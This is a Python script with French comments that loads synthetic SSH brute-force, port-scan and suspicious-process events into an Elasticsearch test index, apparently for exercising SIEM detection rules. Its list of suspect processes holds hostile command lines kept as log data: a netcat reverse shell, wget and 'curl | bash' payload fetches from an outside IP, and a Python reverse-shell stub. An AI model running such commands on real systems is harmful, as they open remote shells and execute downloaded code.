#!/usr/bin/env python3
"""
Injecte des événements de test dans Elasticsearch (index auditbeat-soc-test)
pour peupler les dashboards Kibana et déclencher les SIEM rules.

Scénarios disponibles :
  ssh       — Bruteforce SSH (échecs d'authentification répétés)
  portscan  — Scan de ports (connexions réseau vers de multiples ports)
  process   — Exécution de processus suspects (nc, nmap, wget...)
  all       — Les 3 scénarios

Usage :
  python3 generate_events.py [ssh|portscan|process|all] [--count N] [--host HOST]
"""
import json
import random
import sys
import urllib.error
import urllib.request
from datetime import datetime, timezone, timedelta

ES_URL = "http://localhost:9200"
INDEX = "auditbeat-soc-test"

ATTACKER_IPS = [
    "185.220.101.47", "45.33.32.156", "198.51.100.23",
    "203.0.113.99",   "91.108.4.1",   "172.16.254.1",
]
TARGET_HOSTS = ["web-01", "db-01", "bastion", "api-server"]
USERS = ["root", "admin", "ubuntu", "postgres", "deploy"]
PORTS = [22, 23, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]
SUSPECT_PROCS = [
    ("nc",      ["-e", "/bin/bash", "185.220.101.47", "4444"]),
    ("nmap",    ["-sS", "-p", "1-65535", "10.0.0.0/24"]),
    ("wget",    ["http://185.220.101.47/malware.sh", "-O", "/tmp/.x"]),
    ("curl",    ["-s", "http://185.220.101.47/payload", "|", "bash"]),
    ("python3", ["-c", "import socket,subprocess,os;..."]),
    ("chmod",   ["+x", "/tmp/.x"]),
]


def now_minus(seconds: int) -> str:
    ts = datetime.now(timezone.utc) - timedelta(seconds=seconds)
    return ts.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def es_bulk(docs: list[dict]) -> None:
    lines = []
    for d in docs:
        lines.append(json.dumps({"index": {"_index": INDEX}}))
        lines.append(json.dumps(d))
    body = "\n".join(lines) + "\n"
    req = urllib.request.Request(
        f"{ES_URL}/_bulk",
        data=body.encode(),
        headers={"Content-Type": "application/x-ndjson"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as r:
            result = json.loads(r.read())
            errors = [i for i in result.get("items", []) if "error" in i.get("index", {})]
            if errors:
                print(f"  {len(errors)} erreurs bulk", file=sys.stderr)
    except urllib.error.HTTPError as e:
        print(f"  Bulk error {e.code}: {e.read().decode()[:200]}", file=sys.stderr)
        sys.exit(1)


def ensure_index() -> None:
    mapping = {
        "mappings": {
            "properties": {
                "@timestamp":    {"type": "date"},
                "event.module":  {"type": "keyword"},
                "event.category":{"type": "keyword"},
                "event.type":    {"type": "keyword"},
                "event.action":  {"type": "keyword"},
                "event.outcome": {"type": "keyword"},
                "host.name":     {"type": "keyword"},
                "user.name":     {"type": "keyword"},
                "source.ip":     {"type": "ip"},
                "destination.ip":{"type": "ip"},
                "destination.port":{"type": "integer"},
                "process.name":  {"type": "keyword"},
                "process.args":  {"type": "keyword"},
                "message":       {"type": "text"},
            }
        }
    }
    req = urllib.request.Request(
        f"{ES_URL}/{INDEX}",
        data=json.dumps(mapping).encode(),
        headers={"Content-Type": "application/json"},
        method="PUT",
    )
    try:
        with urllib.request.urlopen(req):
            pass
    except urllib.error.HTTPError as e:
        if e.code != 400:  # 400 = index already exists
            print(f"  Index creation error {e.code}", file=sys.stderr)


# ─── Scénario 1 : Bruteforce SSH ─────────────────────────────────────────────

def gen_ssh_bruteforce(count: int) -> list[dict]:
    docs = []
    attacker = random.choice(ATTACKER_IPS)
    target   = random.choice(TARGET_HOSTS)
    user     = random.choice(USERS)

    # N-1 échecs, 1 succès final (optionnel)
    for i in range(count):
        outcome = "success" if i == count - 1 and random.random() < 0.3 else "failure"
        ev_type = "authentication_success" if outcome == "success" else "authentication_failure"
        docs.append({
            "@timestamp":     now_minus(count - i),
            "event.module":   "system",
            "event.dataset":  "system.auth",
            "event.category": "authentication",
            "event.type":     ev_type,
            "event.action":   "ssh_login",
            "event.outcome":  outcome,
            "host.name":      target,
            "user.name":      user,
            "source.ip":      attacker,
            "destination.port": 22,
            "message": (
                f"Accepted password for {user} from {attacker} port 22 ssh2"
                if outcome == "success"
                else f"Failed password for {user} from {attacker} port 22 ssh2"
            ),
        })
    return docs


# ─── Scénario 2 : Port scan ───────────────────────────────────────────────────

def gen_portscan(count: int) -> list[dict]:
    docs = []
    attacker = random.choice(ATTACKER_IPS)
    target   = random.choice(TARGET_HOSTS)
    target_ip = f"10.0.0.{random.randint(1, 50)}"

    scanned_ports = random.sample(range(1, 65535), min(count, 1000))
    for i, port in enumerate(scanned_ports[:count]):
        docs.append({
            "@timestamp":        now_minus(count - i),
            "event.module":      "system",
            "event.dataset":     "system.socket",
            "event.category":    "network",
            "event.type":        "connection_attempt",
            "event.action":      "network_flow",
            "event.outcome":     "failure",
            "host.name":         target,
            "source.ip":         attacker,
            "destination.ip":    target_ip,
            "destination.port":  port,
            "network.transport": "tcp",
            "message": f"Connection attempt from {attacker} to {target_ip}:{port}",
        })
    return docs


# ─── Scénario 3 : Processus suspects ─────────────────────────────────────────

def gen_suspicious_processes(count: int) -> list[dict]:
    docs = []
    host = random.choice(TARGET_HOSTS)
    user = random.choice(USERS)

    for i in range(count):
        proc, args = random.choice(SUSPECT_PROCS)
        docs.append({
            "@timestamp":    now_minus(count - i),
            "event.module":  "auditd",
            "event.dataset": "auditd.log",
            "event.category":"process",
            "event.type":    "process_started",
            "event.action":  "executed",
            "event.outcome": "success",
            "host.name":     host,
            "user.name":     user,
            "process.name":  proc,
            "process.args":  args,
            "process.pid":   random.randint(1000, 9999),
            "message": f"Process {proc} executed by {user} on {host}: {' '.join(args)}",
        })
    return docs


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    args = sys.argv[1:]
    scenario = "all"
    count = 50

    for i, a in enumerate(args):
        if a in ("ssh", "portscan", "process", "all"):
            scenario = a
        elif a == "--count" and i + 1 < len(args):
            count = int(args[i + 1])
        elif a == "--host" and i + 1 < len(args):
            global ES_URL
            ES_URL = args[i + 1]

    print(f"Index cible : {INDEX}")
    ensure_index()

    scenarios = {
        "ssh":      (gen_ssh_bruteforce,       "Bruteforce SSH"),
        "portscan": (gen_portscan,              "Port scan"),
        "process":  (gen_suspicious_processes, "Processus suspects"),
    }

    to_run = list(scenarios.keys()) if scenario == "all" else [scenario]

    for key in to_run:
        fn, label = scenarios[key]
        docs = fn(count)
        print(f"  [{label}] injection de {len(docs)} événements...", end=" ")
        es_bulk(docs)
        print("OK")

    print(f"\nVérification : {ES_URL}/{INDEX}/_count")


if __name__ == "__main__":
    main()
